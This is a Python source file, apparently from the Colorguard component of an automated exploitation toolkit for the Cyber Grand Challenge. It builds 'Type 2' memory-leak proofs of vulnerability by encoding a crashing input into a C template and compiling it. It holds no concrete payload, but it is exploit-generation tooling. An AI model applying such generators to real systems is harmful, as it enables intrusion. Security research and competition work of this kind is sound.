import os
import angr
import tempfile
import compilerex
from rex.exploit.cgc import CGCExploit
from povsim import CGCPovSimulator
from .c_templates import c_template

import logging

l = logging.getLogger("colorguard.pov")

class FakeCrash(object):

    def __init__(self, binary, state):
        self.binary = binary
        self.state = state
        self.project = angr.Project(self.binary)

class ColorguardType2Exploit(CGCExploit):
    """
    A Type2 exploit created using the Colorgaurd approach.
    """

    def __init__(self, binary, state, input_string, harvester, leak_ast, output_var):
        """
        :param binary: path to binary
        :param input_string: string which causes the leak when used as input to the binary
        :param harvester: AST harvester object
        :param smt_stmt: string SMT statement describing the constraint
        :param output_var: clarpiy output variable
        """
        # fake crash object
        crash = FakeCrash(binary, state)
        super(ColorguardType2Exploit, self).__init__(crash, cgc_type=2, bypasses_nx=True, bypasses_aslr=True)

        self.binary = binary
        self.input_string = input_string
        self.harvester = harvester
        self.output_var = output_var
        self.method_name = 'circumstantial'

        leaked_bytes = harvester.get_largest_consecutive()
        assert len(leaked_bytes) >= 4, "input does not leak enough bytes, 4 bytes required"

        self._arg_vars = [output_var]
        self._mem = leak_ast

        #self._smt_stmt = self._generate_formula(smt_stmt)
        self._generate_formula()

        self._byte_getting_code = self._generate_byte_getting_code()

        self._output_size = harvester.ast.size() / 8

        self._flag_byte_1 = leaked_bytes[0]
        self._flag_byte_2 = leaked_bytes[1]
        self._flag_byte_3 = leaked_bytes[2]
        self._flag_byte_4 = leaked_bytes[3]

    '''
    def _generate_formula(self, formula):

        # clean up the smt statement
        new_form = ""
        output_var_idx = None
        for i, line in enumerate(formula.split("\n")[2:][:-2]):
            if "declare-fun" in line:
                if self.output_var.args[0] in line:
                    output_var_idx = i
            new_form += "\"%s\"\n" % (line + "\\n")

        assert output_var_idx is not None, "could not find output_var"
        assert output_var_idx in [0, 1], "output_var_idx has unexpected value"

        cgc_flag_data_idx = 1 - output_var_idx

        self._output_var_idx = 2 + output_var_idx
        self._cgc_flag_data_idx = 2 + cgc_flag_data_idx

        return new_form
    '''

    def _generate_byte_getting_code(self):

        byte_getters = [ ]
        for b in sorted(self.harvester.output_bytes):
            byte_getters.append("append_byte_to_output(%d);" % b)

        return "\n".join(byte_getters)

    def dump_c(self, filename=None):
        """
        Creates a simple C file to do the Type 2 exploit
        :return: the C code
        """

        encoded_payload = ""
        for c in self.input_string:
            encoded_payload += "\\x%02x" % ord(c)

        fmt_args = dict()
        fmt_args["payload"] = encoded_payload
        fmt_args["payload_len"] = hex(self._payload_len)
        fmt_args["payloadsize"] = hex(len(self.input_string))
        fmt_args["output_size"] = hex(self._output_size)
        fmt_args["solver_code"] = self._solver_code
        fmt_args["recv_buf_len"] = hex(self._recv_buf_len)
        fmt_args["byte_getting_code"] = self._byte_getting_code
        fmt_args["flag_byte_1"] = hex(self._flag_byte_1)
        fmt_args["flag_byte_2"] = hex(self._flag_byte_2)
        fmt_args["flag_byte_3"] = hex(self._flag_byte_3)
        fmt_args["flag_byte_4"] = hex(self._flag_byte_4)

        c_code = c_template
        for k, v in fmt_args.items():
            c_code = c_code.replace("{%s}" % k, v)

        if filename is not None:
            with open(filename, 'w') as f:
                f.write(c_code)
        else:
            return c_code

    def dump_binary(self, filename=None):
        c_code = self.dump_c()
        compiled_result = compilerex.compile_from_string(c_code,
                                                         filename=filename)

        if filename:
            return None

        return compiled_result
